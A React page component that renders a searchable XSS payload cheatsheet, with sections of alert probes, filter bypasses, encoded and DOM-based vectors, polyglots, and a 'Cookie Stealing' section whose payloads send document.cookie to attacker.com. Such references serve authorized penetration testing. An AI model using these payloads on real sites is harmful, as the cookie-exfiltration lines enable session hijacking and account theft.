"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Code, Search, Copy, Check, ChevronDown, ChevronRight, AlertTriangle } from 'lucide-react';

interface Payload {
    payload: string;
    description: string;
}

interface Section {
    title: string;
    payloads: Payload[];
}

const sections: Section[] = [
    {
        title: 'Basic Payloads',
        payloads: [
            { payload: '<script>alert(1)</script>', description: 'Basic script tag' },
            { payload: '<script>alert(document.domain)</script>', description: 'Show domain' },
            { payload: '<script>alert(document.cookie)</script>', description: 'Show cookies' },
            { payload: '<img src=x onerror=alert(1)>', description: 'Image error handler' },
            { payload: '<svg onload=alert(1)>', description: 'SVG onload' },
            { payload: '<body onload=alert(1)>', description: 'Body onload' },
        ]
    },
    {
        title: 'Event Handlers',
        payloads: [
            { payload: '<div onmouseover=alert(1)>hover me</div>', description: 'Mouse over event' },
            { payload: '<input onfocus=alert(1) autofocus>', description: 'Auto focus input' },
            { payload: '<marquee onstart=alert(1)>', description: 'Marquee start' },
            { payload: '<video><source onerror=alert(1)>', description: 'Video source error' },
            { payload: '<details open ontoggle=alert(1)>', description: 'Details toggle' },
            { payload: '<select onfocus=alert(1) autofocus>', description: 'Select focus' },
        ]
    },
    {
        title: 'Filter Bypass',
        payloads: [
            { payload: '<ScRiPt>alert(1)</ScRiPt>', description: 'Mixed case' },
            { payload: '<script>alert`1`</script>', description: 'Template literals' },
            { payload: '<img src=x onerror="alert(1)">', description: 'Quoted attribute' },
            { payload: '<img src=x onerror=alert&lpar;1&rpar;>', description: 'HTML entities' },
            { payload: '<svg/onload=alert(1)>', description: 'No space needed' },
            { payload: '"><script>alert(1)</script>', description: 'Break out of attribute' },
            { payload: "'-alert(1)-'", description: 'Break out of JS string' },
        ]
    },
    {
        title: 'Encoded Payloads',
        payloads: [
            { payload: '<script>eval(atob("YWxlcnQoMSk="))</script>', description: 'Base64 encoded' },
            { payload: '<script>\\u0061lert(1)</script>', description: 'Unicode escape' },
            { payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', description: 'HTML decimal' },
            { payload: '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>', description: 'HTML hex' },
            { payload: '%3Cscript%3Ealert(1)%3C/script%3E', description: 'URL encoded' },
        ]
    },
    {
        title: 'DOM Based',
        payloads: [
            { payload: '#<script>alert(1)</script>', description: 'Fragment injection' },
            { payload: 'javascript:alert(1)', description: 'JavaScript protocol' },
            { payload: 'data:text/html,<script>alert(1)</script>', description: 'Data URI' },
            { payload: '<a href="javascript:alert(1)">click</a>', description: 'Anchor href' },
            { payload: '<iframe src="javascript:alert(1)">', description: 'Iframe src' },
        ]
    },
    {
        title: 'Cookie Stealing',
        payloads: [
            { payload: '<script>new Image().src="http://attacker.com/?c="+document.cookie</script>', description: 'Image request' },
            { payload: '<script>fetch("http://attacker.com/?c="+document.cookie)</script>', description: 'Fetch API' },
            { payload: '<img src=x onerror="location=\'http://attacker.com/?c=\'+document.cookie">', description: 'Redirect with cookie' },
        ]
    },
    {
        title: 'Polyglots',
        payloads: [
            { payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//...', description: 'Multi-context polyglot' },
            { payload: '"><img src=x onerror=alert(1)>//', description: 'HTML/JS context' },
            { payload: '\'-alert(1)-\'', description: 'JS string context' },
        ]
    },
];

const XSSCheatsheetPage = () => {
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
    const [expandedSections, setExpandedSections] = useState<string[]>(sections.map(s => s.title));

    const copyToClipboard = async (text: string) => {
        await navigator.clipboard.writeText(text);
        setCopiedPayload(text);
        setTimeout(() => setCopiedPayload(null), 2000);
    };

    const toggleSection = (title: string) => {
        setExpandedSections(prev => 
            prev.includes(title) ? prev.filter(t => t !== title) : [...prev, title]
        );
    };

    const filteredSections = sections.map(section => ({
        ...section,
        payloads: section.payloads.filter(p =>
            p.payload.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.description.toLowerCase().includes(debouncedSearch.toLowerCase())
        )
    })).filter(section => section.payloads.length > 0);

    return (
        <div className="min-h-screen bg-black">
            {/* Hero */}
            <section className="relative pt-32 pb-16 px-4 sm:px-6">
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-orange-500/10 rounded-full blur-[120px] pointer-events-none" />
                
                <div className="relative max-w-4xl mx-auto text-center">
                    <div className="inline-flex items-center gap-2 px-4 py-2 mb-8 rounded-full border border-white/10 bg-white/5">
                        <Code className="w-4 h-4 text-orange-500" />
                        <span className="text-sm text-gray-400">Cheatsheet</span>
                    </div>

                    <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-white mb-6">
                        XSS <span className="text-orange-500">Payloads</span>
                    </h1>

                    <p className="text-lg text-gray-400 max-w-xl mx-auto">
                        Cross-Site Scripting payloads and filter bypass techniques.
                    </p>
                </div>
            </section>

            {/* Warning */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="flex items-start gap-3 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
                    <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-yellow-200/80">
                        <strong>Educational purposes only.</strong> Only test on systems you own or have explicit authorization.
                    </p>
                </div>
            </section>

            {/* Search */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="relative">
                    <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search payloads..."
                        className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                    />
                </div>
            </section>

            {/* Payloads */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 pb-20">
                <div className="space-y-4">
                    {filteredSections.map((section) => (
                        <div key={section.title} className="rounded-xl border border-white/10 bg-white/[0.02] overflow-hidden">
                            <button
                                onClick={() => toggleSection(section.title)}
                                className="w-full flex items-center justify-between p-4 text-left hover:bg-white/[0.02] transition-colors"
                            >
                                <h2 className="font-medium text-white">{section.title}</h2>
                                <div className="flex items-center gap-2">
                                    <span className="text-xs text-gray-500">{section.payloads.length} payloads</span>
                                    {expandedSections.includes(section.title) 
                                        ? <ChevronDown className="w-4 h-4 text-gray-400" />
                                        : <ChevronRight className="w-4 h-4 text-gray-400" />
                                    }
                                </div>
                            </button>

                            {expandedSections.includes(section.title) && (
                                <div className="border-t border-white/5">
                                    {section.payloads.map((item, index) => (
                                        <div 
                                            key={index}
                                            className="flex items-start justify-between p-4 border-b border-white/5 last:border-0 hover:bg-white/[0.02] transition-colors group"
                                        >
                                            <div className="flex-1 min-w-0">
                                                <p className="text-sm text-gray-400 mb-2">{item.description}</p>
                                                <code className="block text-sm font-mono bg-black/50 px-3 py-2 rounded overflow-x-auto syntax-highlight-html">
                                                    {item.payload}
                                                </code>
                                            </div>
                                            <button
                                                onClick={() => copyToClipboard(item.payload)}
                                                className="p-2 text-gray-500 hover:text-white sm:opacity-0 sm:group-hover:opacity-100 transition-all ml-2"
                                            >
                                                {copiedPayload === item.payload 
                                                    ? <Check className="w-4 h-4 text-green-400" />
                                                    : <Copy className="w-4 h-4" />
                                                }
                                            </button>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>
                    ))}
                </div>
            </section>
        </div>
    );
};

export default XSSCheatsheetPage;
